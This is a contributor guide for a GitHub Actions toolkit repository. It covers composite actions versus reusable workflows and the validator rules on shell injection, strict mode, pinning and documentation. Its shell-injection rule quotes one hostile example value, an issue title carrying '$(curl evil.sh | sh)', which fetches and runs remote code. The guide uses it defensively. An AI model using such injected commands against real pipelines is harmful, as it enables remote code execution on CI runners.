# Authoring

How to add an action or a reusable workflow to this repo. The rules here are enforced by
`scripts/validate-manifests.mjs`, so a PR that breaks one fails CI with the rule name.

---

## Which layer

| Build a… | When |
|---|---|
| **Composite action** (`actions/<name>/action.yml`) | It does one thing, has no opinion about triggers, and is useful inside somebody else's workflow. |
| **Reusable workflow** (`.github/workflows/<name>.yml`) | It's an end-to-end pipeline with jobs, gating, and permissions. |

Prefer the action. A workflow that turns out to be one job with one step should have been
an action; the reverse — needing job-level parallelism from something built as an action —
means a rewrite.

Composite actions are the **leaves**: they never reference each other. Composition happens
in the workflow layer, where the `.toolkit` checkout makes paths unambiguous.

---

## Scaffold

```bash
make new-action NAME=deploy-foo
$EDITOR actions/deploy-foo/action.yml
make docs          # generates actions/deploy-foo/README.md and the catalog row
make all           # everything CI runs
```

---

## The rules

### 1. Never interpolate `${{ }}` into a `run:` body

`${{ }}` is substituted into the script *text* before bash parses it. An issue title
containing `$(curl evil.sh | sh)` becomes a command.

```yaml
# ✗ shell injection
- run: echo "Deploying ${{ inputs.service }}"

# ✓
- env:
    SERVICE: ${{ inputs.service }}
  run: |
    set -euo pipefail
    echo "Deploying $SERVICE"
```

There is **no escape** for the interpolation opener. Don't write it in a comment or an
error message inside a `run:` block either — Actions will still try to evaluate it. Say
"the toJSON(secrets) expression" in prose instead.

*Rule: `shell-injection`.*

### 2. Every `run:` starts with `set -euo pipefail`

Without it a failed command is ignored and the step reports success — which in a deploy
pipeline means shipping nothing and saying you shipped.

For teardown that genuinely must not fail the job, keep strict mode and be explicit:

```yaml
run: |
  set -euo pipefail
  # Teardown must not fail the job — the tests already reported their verdict.
  docker compose down -v || true
```

*Rule: `strict-mode`.*

### 3. Composite actions never `uses:` another action from this repo

Relative-path resolution inside a composite action depends on how the action was reached,
so a sibling reference works in this repo's tests and breaks for consumers. Emit outputs
and let the workflow wire them.

*Rule: `no-local-action-refs`.*

### 4. Reusable workflows check the toolkit out at `job_workflow_sha`

Inside a called workflow `./` is the **caller's** checkout. Every job that uses a toolkit
action needs this first, verbatim:

```yaml
- uses: actions/checkout@v7
  with:
    repository: patrickisgreat/actions-toolkit
    ref: ${{ github.job_workflow_sha || github.sha }}
    path: .toolkit

- uses: ./.toolkit/actions/setup-node
```

Never hardcode a tag in that `ref`. `job_workflow_sha` is the SHA of the workflow file
being executed, which is what keeps actions and workflow at the same version.

*Rules: `toolkit-checkout`.*

### 5. Document everything, default everything

Every input needs a `description`. Every optional input needs an explicit `default`, even
`''`. Every output needs a `description`, and composite outputs need a `value`. Inputs are
kebab-case.

Descriptions become the generated tables, so write them for a reader who has not seen the
implementation. Say what it controls and what happens at the boundaries.

*Rules: `documented`, `naming`.*

### 6. Pin third-party actions

At least a major tag. Dependabot keeps them current; an unpinned `@main` is somebody else's
write access to your pipeline.

*Rule: `pinned-uses`.*

### 7. Fail fast, and name the thing

```yaml
run: |
  set -euo pipefail
  if [ -z "$ROLE" ] && [ -z "$KEY_ID" ]; then
    echo "::error::No AWS credentials provided. Set role-to-assume (OIDC, preferred) or aws-access-key-id."
    exit 1
  fi
```

A clear error at step one beats a 403 four steps later.

---

## Write the header comment

The leading `#` block of every manifest is lifted into the generated README, so it is the
documentation, not a note to yourself. Explain **why the thing is shaped the way it is** —
the tradeoff, the failure mode it avoids, the gotcha someone would otherwise rediscover.

The generated tables already say what the inputs are. The comment should say what the
tables can't:

```
# Publish a static site to S3 and invalidate CloudFront.
#
# The part people get wrong is cache headers, so this action makes the correct behaviour
# the default. […] So the upload happens in two passes: long-lived immutable assets first,
# then no-cache entry points, then the delete pass. Uploading in that order means a visitor
# mid-deploy can never fetch a new HTML file that points at assets which haven't landed yet.
```

The first sentence becomes the catalog summary — make it a complete thought.

---

## Conventions the linter can't check

- **Parameterize, don't fork.** One workflow with a `target` input beats three that drift.
  If a new case needs a different *shape* rather than different values, that's a new file.
- **Secure and cheap by default.** Read-only permissions, OIDC over keys, smallest runner,
  skip drafts and forks where secrets aren't available.
- **Warn on the escape hatch.** Static keys, `plan-file: ''`, `fail-on-severity: ''` — all
  supported, all emit a `::warning::` so they don't become the silent default.
- **Job summaries.** Anything with a result worth seeing writes to `$GITHUB_STEP_SUMMARY`.
  It costs nothing and beats scrolling a log.
- **Report and gate separately.** Ship the check reporting; let the caller opt into
  blocking. A gate that lands red on day one gets disabled, not fixed.

---

## Test it

Add coverage to `.github/workflows/self-ci.yml`. Static analysis proves a jq filter parses;
only running it proves the filter produces the shape the next step reads.

- **No credentials needed?** Add a step to `test-actions` that runs it and *asserts its
  outputs*. A step that runs without asserting proves only that it didn't crash.
- **Needs a project to act on?** Add a dependency-free fixture under `tests/fixtures/`.
- **New reusable workflow?** Add a `consume-*` job calling it, which exercises the
  `.toolkit` mechanism the same way a real consumer does.
- **Needs cloud credentials?** It can't run in CI. Say so in the header comment, and be
  correspondingly more careful in review.

---

## Checklist

- [ ] `make all` passes (lint, validate, docs drift)
- [ ] `make docs` re-run and the generated README committed
- [ ] Header comment explains the *why*, first sentence is a complete summary
- [ ] Every input/output described; optional inputs have defaults; names kebab-case
- [ ] No `${{ }}` in any `run:`; every `run:` sets strict mode
- [ ] Third-party `uses:` pinned
- [ ] Self-CI coverage added, or a note explaining why it can't be tested
- [ ] Secrets documented, and a fail-fast check naming any that are required
- [ ] Conventional Commit; `BREAKING CHANGE:` if [VERSIONING.md](VERSIONING.md) says so
